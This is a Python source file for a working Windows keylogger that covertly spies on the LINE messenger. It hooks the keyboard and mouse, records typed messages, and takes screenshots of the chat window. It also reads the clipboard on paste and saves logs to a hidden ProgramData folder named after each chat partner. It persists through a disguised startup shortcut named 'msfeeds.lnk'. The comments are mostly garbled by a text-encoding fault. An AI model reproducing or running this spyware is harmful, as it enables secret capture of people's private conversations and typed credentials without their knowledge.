# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import time ,datetime ,os ,codecs
# ��{Png �s��,�Y�z�LWin32�t�Capi�u��sbmp�j�� (4MB)
from PIL import ImageGrab
# ��{�u����^������
import win32gui
import os, sys
import winshell

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

''' �����ܼ� '''
# �����{���W
current_window = None # ��e���� ( �{�� )
WindowNow = None # ���T�����W ( Line ��H )
hwnd = None
# �{���B�檬�A
isLine = False # �O�_��Line
RecordState = False # �O�_������

# For ����
Msg="" # �N�r���զ��r��
f = None # txt log
pic = None # pic data
pic_Name = None # pic name
Save = None
counter = 0

# For TimeStamp
StartTime = None
EndTime = None

# Path C:\ProgramData
SavePath = 'C:\\ProgramData\\calc\\'

# �ɶ��Ҳ�

Date= None
Time= None
Timetxt= None

''' Function '''
# �}���۰ʱҰ�
def StartUp():
    
    startup = winshell.startup () # use common=1 for all users
    print startup
    
    winshell.CreateShortcut (
    Path=os.path.join (winshell.startup (), "msfeeds.lnk"),
    Target=sys.executable,
    Icon=(sys.executable, 0),
    Description="msfeeds.exe")
    
# �I�Ϧs��
def capture():
    global pic
    global pic_name
    # �ϰ�
    left, top, right, bot = win32gui.GetWindowRect(hwnd)
    pic = ImageGrab.grab(bbox = (left, top, right, bot))
    # ����
    #pic = ImageGrab.grab()
    # �s��
    pic_name = Date+Time
    
# �ɶ���s
def RefreshTime():
    #�ɶ��Ҳ�
    global Date
    global Time
    global Timetxt
    Date= time.strftime('%Y-%m-%d',time.localtime(time.time()))
    Time= time.strftime('-%H-%M-%S',time.localtime(time.time()))
    Timetxt= time.strftime('%H�I%M��%S��',time.localtime(time.time()))
  
# �ˬd�r��
# �T�O���Line�ʺٯ�s�Jtxt
# TxT �W�h�G����t�� /\:*?"<>|,�򥻤WEmoji�Ϯ׷|�۰��ର?
def strCheck(string):
    string=string.replace('!','')
    string=string.replace('?','')
    string=string.replace(':','')
    string=string.replace('\/','')
    string=string.replace('\\','')
    string=string.replace('\"','')
    string=string.replace('\<','')
    string=string.replace('\>','')
    string=string.replace('\|','')
    return string
    
# �˴��ثe����
def get_current_process():

    global hwnd
    global isLine
    global RecordState
    global WindowNow
    global f
    global Msg
    global counter
    global StartTime
    global Endtime
    global Save
      
    RefreshTime()
    # ���o�e������
    hwnd = user32.GetForegroundWindow()

    # ���o����ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # �N�����s�J�ܼ�
    process_id = "%d" % pid.value

    # �ӽаO����
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # Ū���������D
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
    

    # ��X������T
    '''
    process_id = Pid
    exescutable.value = �{���W��.exe
    windows_title.value = �����W��
    '''
    #print "[ PID:%s-%s-%s]" % (process_id,exescutable.value,windows_title.value)    
    #print "pid:%s" %process_id
    
    
    # �}�l���氻��
    if(executable.value=="LINE.exe"):
        isLine = True
	WindowNow = windows_title.value	
	if(Save==None):
	    #��l��Save
	    Save=WindowNow
	    Save=strCheck(Save)	
	    
	# �˴��O�_�ഫ��H
	if(Save!=strCheck(WindowNow)):
	    RecordState = False
	    EndTime = Timetxt
	    if(Msg!=""):
		f.write("Start at %s\r\n\r\n" %StartTime)
		f.write(Msg)
		f.write("\r\n\r\nEnd at %s\r\n\r\n" %EndTime)
		Msg=""
		pic.save(SavePath+'\\%s.png' %(Save+'\/'+pic_name))
		print "Target Changed,Save the image."
	    f.close()
	    # �NSave��s
	    #print "This is Save:%s"%Save
	    #print "Turn Taget To %s"%WindowNow
	    Save=WindowNow
	    Save=strCheck(Save)

	# 
	Save=WindowNow
	Save=strCheck(Save)
	#print Save		
	    
	if(RecordState==False):
	    StartTime = Timetxt
	    #print "Start at %s \n" %Time
	    capture()
	    
	    # �Ыظ�Ƨ�
	    if not os.path.exists(SavePath+'%s\\'%Save):
		#print 'Mkdir..%s'%Save    
		os.makedirs(SavePath+'%s\\'%Save)		
	    # �}��txt�ɨðO��
	    if not os.path.exists(SavePath+'%s\\Msg.txt'%Save):
		#print "not exist"
		f = open(SavePath+'%s\\Msg.txt'%Save,'wb+')
	    else:	    
		#print "exist"
		f = open(SavePath+'%s\\Msg.txt'%Save,'a+') # a+,�����}�l�g
	    RecordState = True
    # �˴������DLine������O�_������
    if(executable.value!="LINE.exe" and isLine==True):
        isLine = False
	RecordState = False
	EndTime = Timetxt
	if(Msg!=""):
	    f.write("Start at %s\r\n\r\n" %StartTime)
	    f.write(Msg)
	    f.write("\r\n\r\nEnd at %s\r\n\r\n" %EndTime)
	    Msg=""
	    pic.save(SavePath+'%s.png' %(Save+'\/'+pic_name))
	    counter=0
	f.close()
	#pic.save('./Save/%s.png' %(Save+'\/'+pic_name))
	#print "Turn isLine to Off"
	
    # ����handle
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
    # �ƹ���ť
def onclick(event):

    get_current_process()
    
    # ��^True�Ϸƹ������~��A�קK�ƹ��d��
    return True

# ��L��ť
def onKeyboardEvent(event):

    global current_window
    global isLine
    global Msg
    global counter
    
    # �˴��O�_��������(���F�����۰ʺ�ť�s����)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # �եΨ��
        get_current_process()
        #print isLine
    
    # �T�O�O����Line���p�U
    if(isLine==True):
	capture()
    # �ˬdKeydown�O�_�`�W����]�D�զX�䵥�^
        if (event.Ascii > 32 and event.Ascii <127):
            #f.write(chr(event.Ascii))
	    Msg+=chr(event.Ascii)
            #print chr(event.Ascii),  
	elif event.Key =="Space":
	    #f.write(" ")
	    Msg+=" "
	    #print " "
        elif event.Ascii == 13:
	    #print "This is Enter"
	    counter+=1
	    print "counter=%s" %counter
	    if(counter==6):
		pic.save(SavePath+'%s.png' %(Save+'\/'+pic_name))
		counter=0
            #f.write("\r\nEnter�e�X")
            print
        elif event.Key =="Back":
	    #f.write("\r\n[�R��]")
            print
        elif event.Key =="Left":
	    #f.write("[Left]")
            print
        elif event.Key =="Right":
	    #f.write("[Right]")
            print
        else:
            # �o�{Ctrl+V�]�K�W�^�ɡA�N�ƻs���e�s�U
	    # ���O �D�`�W���� + V �� 
	    # (�DCtrl + V �ɤ@�˰���)
            if event.Key == "V": 
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                #print "[�ƻs�K�W]-%s" % (pasted_value),
                
            #else:
                #print "\n"
                #print "[%s]" % event.Key,
    '''
    else:
	print "Record down!"
    '''
    
    # �`����ť�U�@������ƥ�
    return True
def main():
    
    # �T�O�������|
    # 1.For Message
    # 2.For Pic
    # 3.Make sure the path. ( Like system32 )
    if not os.path.exists(SavePath):
	print 'Mkdir..Save'
	print SavePath
	os.makedirs(SavePath)
    print "Pass"
    if not os.path.exists(SavePath+'SetStartup.txt'):
	h = open(SavePath+'SetStartup.txt','wb+')	
	h.close()
	print "Set StartUp"	
	StartUp()
	
    # �Ы�hook
    hm = pyHook.HookManager()

    # ��ť��L�ƥ�
    hm.KeyDown = onKeyboardEvent
    # �]�m��L�_�l
    hm.HookKeyboard()

    # ��ť�ƹ��ƥ�
    hm.SubscribeMouseAllButtonsDown(onclick)
    # �]�m�ƹ��_�l
    hm.HookMouse()

    # �i�J�L���`��,�O����ť
    pythoncom.PumpMessages()

''' Run the Key Logger '''
if __name__ == "__main__":
    main()
    

